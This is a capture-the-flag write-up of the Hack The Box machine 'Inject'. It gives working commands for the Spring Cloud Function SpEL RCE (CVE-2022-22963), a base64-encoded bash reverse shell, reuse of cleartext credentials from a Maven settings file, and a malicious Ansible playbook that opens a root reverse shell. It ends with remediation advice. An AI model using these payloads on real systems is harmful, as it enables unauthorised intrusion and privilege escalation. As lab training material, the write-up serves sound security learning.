# HTB — Inject

![HTB Badge](https://img.shields.io/badge/HackTheBox-Inject-green?style=flat-square&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Retired-lightgrey?style=flat-square)

**IP:** `10.129.228.213` | **Date:** 19 June 2026 | **Author:** atimal04

---

## Summary

Inject is an Easy Linux machine centred around a Spring Boot web application with a file upload feature. Initial access is gained by exploiting **CVE-2022-22963**, a critical SpEL injection vulnerability in Spring Cloud Function that allows unauthenticated Remote Code Execution. Lateral movement to a second user is achieved through cleartext credentials found in a Maven settings file. Privilege escalation to root abuses a misconfigured Ansible automation setup: a cron job runs as root and executes all `.yml` files in a directory writable by the `staff` group, allowing injection of a malicious playbook.

---

## Key Techniques

- CVE-2022-22963 — Spring Cloud Function SpEL RCE
- Cleartext credential discovery in `.m2/settings.xml`
- Ansible playbook injection via writable cron task directory
- Python reverse shell stabilisation with `pty.spawn`

---

## Enumeration

### Port Scan

```bash
nmap -sCV -p- --min-rate 5000 10.129.228.213
```

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 8080 | HTTP    | Spring Boot / Apache Tomcat |

### Web Application

Browsing to `http://inject.htb:8080` reveals a web application with a file upload feature. The endpoint `/show_image?img=` is present and returns image files — a potential path traversal vector worth noting. More importantly, the endpoint `/functionRouter` is exposed, which is associated with **Spring Cloud Function**.

---

## Initial Access — CVE-2022-22963

Spring Cloud Function versions before 3.1.7 / 3.2.3 are vulnerable to **SpEL injection** via the `spring.cloud.function.routing-expression` HTTP header. The expression is evaluated server-side without sanitisation, enabling arbitrary OS command execution.

**Test RCE:**

```bash
curl -s -X POST http://inject.htb:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("id")' \
  --data-raw 'test'
```

**Trigger reverse shell:**

```bash
# Encode payload
echo 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1' | base64

# Send exploit
curl -s -X POST http://inject.htb:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","echo <B64_PAYLOAD>|base64 -d|bash"})' \
  --data-raw 'test'
```

```bash
# Listener
nc -lvnp 4444

# Stabilise
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Shell obtained as **frank** (`uid=1000`).

---

## Lateral Movement — frank → phil

Enumerating frank's home directory reveals a Maven settings file with cleartext credentials:

```bash
cat /home/frank/.m2/settings.xml
```

```xml
<server>
  <id>Inject</id>
  <username>phil</username>
  <password>DocPhillovestoInject123</password>
</server>
```

The password is reused as phil's system account password:

```bash
su - phil
# Password: DocPhillovestoInject123

id
# uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)

cat /home/phil/user.txt
# [USER FLAG]
```

A stable Python reverse shell was established on port 4445 for persistence.

---

## Privilege Escalation — phil → root

### Discovery

Enumerating the filesystem reveals a writable automation directory:

```bash
ls -la /opt/automation/
# drwxrwxr-x 2 root staff 4096  /opt/automation/tasks   ← staff has write

ls -la /opt/automation/tasks/
# -rw-r--r-- 1 root root 150 playbook_1.yml

# No immutable flag
lsattr /opt/automation/tasks/playbook_1.yml
# --------------e----- (only extents — not immutable)
```

phil is in the **staff** group, so he can write to `/opt/automation/tasks/`.

### Cron Job Identification

Process monitoring reveals a root-owned cron job running every ~2 minutes:

```
/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

The `*.yml` glob means **any `.yml` file** placed in the tasks directory will be executed as root.

### Exploitation

Create a malicious Ansible playbook in the writable directory:

```bash
cat > /opt/automation/tasks/shell.yml << 'EOF'
- hosts: localhost
  gather_facts: no
  tasks:
  - name: rev
    ansible.builtin.shell: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.115",4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
EOF
```

Start listener on Kali and wait ~2 minutes for the cron to trigger:

```bash
nc -lvnp 4446

# Connection received:
# root@inject:/opt/automation/tasks# id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# [ROOT FLAG]
```

---

## Attack Chain

```
[Unauthenticated]
       │
       ▼
CVE-2022-22963 (Spring Cloud Function RCE)
       │
       ▼
Shell as frank (port 4444)
       │
       ▼
Cleartext creds in /home/frank/.m2/settings.xml
       │
       ▼
su - phil  →  staff group member (port 4445)
       │
       ▼
Ansible playbook injection → /opt/automation/tasks/shell.yml
       │
       ▼
Root cron executes *.yml  →  Shell as root (port 4446)
       │
       ▼
cat /root/root.txt  ✓
```

---

## Flags

| Flag | Location              |
|------|-----------------------|
| User | `/home/phil/user.txt` |
| Root | `/root/root.txt`      |

---

## Remediation

| Finding | Recommendation |
|---------|----------------|
| CVE-2022-22963 | Upgrade Spring Cloud Function to ≥ 3.1.7 / 3.2.3. Disable SpEL routing if unused. |
| Cleartext credentials | Store secrets in a vault or environment variables. Enforce unique passwords per service. |
| Writable Ansible task dir | Restrict `/opt/automation/tasks/` to root-only write. Avoid glob wildcards in cron commands. Run automation as a dedicated non-root account. |

---

## References

- [CVE-2022-22963 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
- [Spring Security Advisory](https://spring.io/security/cve-2022-22963)
- [Ansible Playbook Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
